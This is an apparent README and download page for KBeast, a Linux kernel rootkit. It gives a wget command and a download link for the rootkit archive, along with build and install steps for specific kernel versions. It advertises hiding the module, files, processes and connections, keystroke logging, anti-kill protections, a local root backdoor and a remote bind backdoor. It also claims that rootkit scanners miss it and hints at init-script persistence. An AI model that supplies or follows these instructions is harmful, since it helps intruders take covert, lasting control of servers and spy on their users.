IPSECS KBEAST - KERNEL BEAST 2012

--[ Quick Install

KBeast (Kernel Beast) is new kernel rootkit based on the publicly known rootkit,
modification is made in order to support kernel 2.6.18 and 2.6.32. Actually it
should work for kernel 2.6.9 up to 2.6.32 or more, but our installer script is
only created for 2.6.18 and 2.6.32. Below are quick step installing the beast:

- wget http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz
- tar zxvf ipsecs-kbeast-v1.tar.gz
- cd kbeast-v1/
- modify config.h to meet your requirement, remember that _MAGIC_NAME_ must be
  user with sh/bash shell
- In order to install in kernel 2.6.18, execute ./setup build 0
- In order to install in kernel 2.6.32, execute ./setup build (actually it
  should work for 2.6.24 or more)
- In order to install in kernel 2.6.9, edit .cc1 file to remove all
  sys_unlinkat() related code and modify syscall table address manually, then 
  execute ./setup build 0

Be kind to note that the beast has been tested in, but not limited to, kernel
2.6.9, 2.6.18, 2.6.32 (i386 or x86_64). 


--[ Features

- Hiding this loadable kernel module
- Hiding files/directory
- Hiding process (ps, pstree, top, lsof)
- Hiding socket and connections (netstat, lsof)
- Keystroke logging to capture user activity
- Anti-kill process
- Anti-remove files
- Anti-delete this loadable kernel modules
- Local root escalation backdoor
- Remote binding backdoor hidden by the kernel rootkit

During my test with chkrootkit and rkhunter, this rootkit wasn.t detected by
those rootkit hunter. The limitation of my rootkit, you have to think yourself
how to load the rootkit when the server rebooted. Believe me that is easy task,
please see modification of init script in ./init/ directory.


--[ Download

Feel free to download the beast at:
http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz


- HAPPY NEW YEAR 2012
